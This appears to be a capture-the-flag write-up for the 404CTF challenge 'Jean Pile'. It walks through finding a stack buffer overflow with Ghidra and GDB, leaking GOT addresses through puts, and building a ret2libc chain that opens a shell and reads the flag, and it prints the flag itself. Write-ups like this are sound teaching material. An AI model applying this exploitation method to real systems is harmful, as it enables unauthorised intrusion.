# Jean Pile

Here is a translated version of the challenge's description we were given :

```md
Annual 404 Race Canteen

Welcome everyone to the annual 404CTF race: it's D-Day, and a restaurant has been made available on-site for the participants. It is owned by someone named Jean Pile, and one thing is clear, his choices for the menu are very strange :

1 chicken, 2 chicken, 3 chicken...

How will you manage to extract information about the other contestants from him ?

Objective : read flag.txt
Please note that ASLR is activated.

Autor : @Narcisse
```

Let's test the program :

```console
$ ./jean_pile 
Bienvenue dans la cantine de la fameuse course annuelle du 404 ctf !
                                              _                    
                                   .-.  .--''` )                  
                                _ |  |/`   .-'`                   
                               ( `\      /`                       
                               _)   _.  -'._                       
                             /`  .'     .-.-;                      
                             `).'      /  \  \                   
                            (`,        \_o/_o/__                  
                             /           .-''`  ``'-.              
                             {         /` ,___.--''`             
                             {   ;     '-. \ \                  
           _   _             {   |'-....-`'.\_\                =============menu=============
          / './ '.           \   \          `"`                |                            |
       _  \   \  |            \   \                            |          1 pouler          |
      ( '-.J     \_..----.._ __)   `\--..__                    |          2 pouler          |
     .-`                    `        `\    ''--...--.          |          3 pouler          |
    (_,.--`/`         .-             `\       .__ _)           |                            |
            |          (                 }    .__ _)           ==============================
            \_,         '.               }_  - _.'                
               \_,         '.            } `'--'                  
                  '._.     ,_)          /                          
                     |    /           .'                           
                      \   |    _   .-'                            
                       \__/;--.||-'                               
                        _||   _||__   __                           
                 _ __.-` "`)(` `"  ```._)                        
                (_`,-   ,-'  `''-.   '-._)                         
               (  (    /          '.__.'                           
                `"`'--'"                                         

Voulez-vous commander un plat ou plus ?
>>> 1
Choisissez un plat.
>> 1
Merci à vous bonne soirée!
```

The program is asking for user inputs, let's see if it those are vulnerable to a buffer overflow.

## Static analysis

Using Ghidra, we can find this function :

```C
void service(void)
{
  char *pcVar1;
  char local_38 [40];
  int local_10;
  int local_c;
  
  puts("Voulez-vous commander un plat ou plus ?");
  printf(">>> ");
  fflush(stdin);
  __isoc99_scanf("%d",&local_10);
  getchar();
  if (local_10 == 1) {
    puts("Choisissez un plat.");
    printf(">> ");
    pcVar1 = fgets(local_38,200,stdin);
    if (pcVar1 == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    for (local_c = 0; local_c < 200; local_c = local_c + 1) {
      if (local_38[local_c] == '\n') {
        local_38[local_c] = '\0';
      }
    }
  }
  else {
    puts("Choisissez un plat.");
    printf(">> ");
    pcVar1 = fgets(local_38,200,stdin);
    if (pcVar1 == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    for (local_c = 0; local_c < 200; local_c = local_c + 1) {
      if (local_38[local_c] == '\n') {
        local_38[local_c] = '\0';
      }
    }
    puts("Un nouveau serveur revient vers vous pour la suite de votre commande au plus vite.");
    service();
  }
  return;
}
```

This is the function used to get the user input, in which we can spot these lines : `char local_38 [40];`, `pcVar1 = fgets(local_38,200,stdin);`. The program is asking for an input of 200 bytes even tho `local_38` is only 40 bytes long : this is vulnerable to a buffer overflow.

There does not seem to be a win function, and ASLR is activated, but the file is dynamically linked and the program is using the `puts` function : we can execute a ret2lib.  
  
ret2lib is a way to bypass ASLR by leaking the GOT : this contains the addresses of functions from the libc used at run time by our program. Libc contains functions such as `system` we can use to spawn a shell. To find these addresses, we'll leak some of the GOT table entries by using the `puts` function to print them. Using this leak, we'll go online and determine which libc we're dealing with. Once we found the right one, we can use the offset between the function's address we have (such as `puts`), and the function's address we want (such as `system`), to calculate where we want to redirect program execution.

## Dynamic analysis

First let's use GDB to find out what offset we need to redirect program execution :

```gdb
gef➤  x/2i *service+256
   0x400a36 <service+256>:	call   0x400680 <fgets@plt>
   0x400a3b <service+261>:	test   rax,rax

gef➤  break *service+261
Breakpoint 1 at 0x400a3b

gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40)')
```
```gdb
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9f0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"	 ← $rax, $rcx, $rsp
0x00007fffffffd9f8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
0x00007fffffffda00│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
0x00007fffffffda08│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAA\n"
0x00007fffffffda10│+0x0020: "AAAAAAAAAAAAAAA\n"
0x00007fffffffda18│+0x0028: "AAAAAAA\n"
0x00007fffffffda20│+0x0030: 0x00007fffffffda00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"	 ← $rbp
0x00007fffffffda28│+0x0038: 0x0000000000400b00  →  <main+0074> lea rdi, [rip+0xa56]        # 0x40155d
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400a2e <service+00f8>   mov    esi, 0xc8
     0x400a33 <service+00fd>   mov    rdi, rax
     0x400a36 <service+0100>   call   0x400680 <fgets@plt>
 →   0x400a3b <service+0105>   test   rax, rax
     0x400a3e <service+0108>   jne    0x400a4a <service+276>
     0x400a40 <service+010a>   mov    edi, 0xffffffff
     0x400a45 <service+010f>   call   0x4006d0 <exit@plt>
     0x400a4a <service+0114>   mov    DWORD PTR [rbp-0x4], 0x0
     0x400a51 <service+011b>   jmp    0x400a6f <service+313>
```

The rbp is stored right after our input on the stack : we'll need an offset of 48 to reach it.  
  
Now, to leak the GOT table, we'll need to pass arguments to the `puts` function. Let's see what register is used to do so :

```gdb
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007c7 <menu+0000>      push   rbp
     0x4007c8 <menu+0001>      mov    rbp, rsp
     0x4007cb <menu+0004>      lea    rdi, [rip+0x3d6]        # 0x400ba8
 →   0x4007d2 <menu+000b>      call   0x400660 <puts@plt>
   ↳    0x400660 <puts@plt+0000>  jmp    QWORD PTR [rip+0x2019b2]        # 0x602018 <puts@got.plt>
        0x400666 <puts@plt+0006>  push   0x0
        0x40066b <puts@plt+000b>  jmp    0x400650
        0x400670 <printf@plt+0000> jmp    QWORD PTR [rip+0x2019aa]        # 0x602020 <printf@got.plt>
        0x400676 <printf@plt+0006> push   0x1
        0x40067b <printf@plt+000b> jmp    0x400650
───────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
puts@plt (
   $rdi = 0x0000000000400ba8 → "                                              _   [...]"
)
```

We can see that the rdi is used to pass arguments to the `puts` function. We'll need a gadget to modify it :

```console
$ ROPgadget --binary jean_pile | grep rdi
0x0000000000400b83 : pop rdi ; ret
```

Finally, we'll need to leak several addresses of the GOT to get a better idea of which libc we are working with. Let's find two more GOT entries :

```gdb
gef➤  x/i main+29
   0x400aa9 <main+29>:	call   0x4006b0 <setvbuf@plt>

gef➤  x/i service+256
   0x400a36 <service+256>:	call   0x400680 <fgets@plt>
```

Using all of these informations, we can write [this script](./leak.py) that gives us this leak :

```python
$ python3 leak.py
[*] '/home/coucou/Documents/404CTF_WriteUps/Jean_Pile/jean_pile'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Opening connection to challenges.404ctf.fr on port 31957: Done
puts : 0x7f256ab5b980
setvbuf : 0x7f256ab5bf90
fgets : 0x7f256ab5a040
[*] Closed connection to challenges.404ctf.fr port 31957
```

We can now use a libc database such as [this once](https://libc.rip/) to find the offsets we need :

```md
puts	0x77980
system	0x4c490
str_bin_sh	0x196031
```

`str_bin_sh` being the string `/bin/sh` we'll need to give to `system` as parameter to open a shell. Using those three values, we can now calculate the addresses we need to pwn this program.

## Exploit

Using [this final script](./exploit.py), we leak the GOT tables from which we calculate the address to `system` and `/bin/sh`. Then we redirect the program towards the beginning of the function `service` to send another payload to open a shell :

```python
$ python3 exploit.py     
[*] '/home/coucou/Documents/404CTF_WriteUps/Jean_Pile/jean_pile'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Opening connection to challenges.404ctf.fr on port 31957: Done
[*] Switching to interactive mode
$ ls
flag.txt
jean_pile
$ cat flag.txt
404CTF{f4n_2_8denn3u}
```

We get the flag !
